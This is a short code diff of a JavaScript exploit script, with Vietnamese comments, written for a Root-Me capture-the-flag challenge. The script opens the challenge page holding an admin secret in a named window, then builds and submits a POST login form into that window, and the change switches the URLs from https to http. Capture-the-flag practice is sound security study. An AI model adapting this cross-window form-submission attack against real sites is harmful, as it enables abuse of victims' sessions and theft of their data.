@@ -1,7 +1,7 @@
 <script>
     // 1. Mở trang CHỨA SECRET trước (Trang chủ/Profile của Admin)
     // Đặt tên cho cửa sổ này là 'secret_window'
-    var win = window.open("https://challenge01.root-me.org:58003/", "secret_window");
+    var win = window.open("http://challenge01.root-me.org:58003/", "secret_window");
 
     // 2. Chờ một chút để trang Secret load xong
     setTimeout(() => {
@@ -11,7 +11,7 @@
         
         const form = document.createElement('form');
         form.method = 'POST';
-        form.action = 'https://challenge01.root-me.org:58003/login';
+        form.action = 'http://challenge01.root-me.org:58003/login';
         form.target = "secret_window"; // Cực kỳ quan trọng: Submit vào đúng cửa sổ đó
 
         const input = document.createElement('input');
